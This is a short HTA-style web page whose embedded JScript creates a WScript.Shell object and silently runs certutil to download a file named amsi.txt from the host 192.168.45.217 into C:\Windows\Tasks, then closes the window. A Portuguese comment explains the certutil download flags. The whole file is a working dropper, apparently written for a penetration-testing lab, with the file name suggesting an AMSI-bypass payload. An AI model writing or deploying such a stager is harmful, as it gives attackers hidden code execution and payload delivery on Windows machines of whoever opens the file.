<html>
<head>
    <script language="JScript">
        var shell = new ActiveXObject("WScript.Shell");
        // -urlcache força o download e -f sobrescreve se já existir
        var cmd = "cmd.exe /c certutil.exe -urlcache -split -f http://192.168.45.217/amsi.txt C:\\Windows\\Tasks\\amsi.txt";
        shell.Run(cmd, 0);
        window.close();
    </script>
</head>
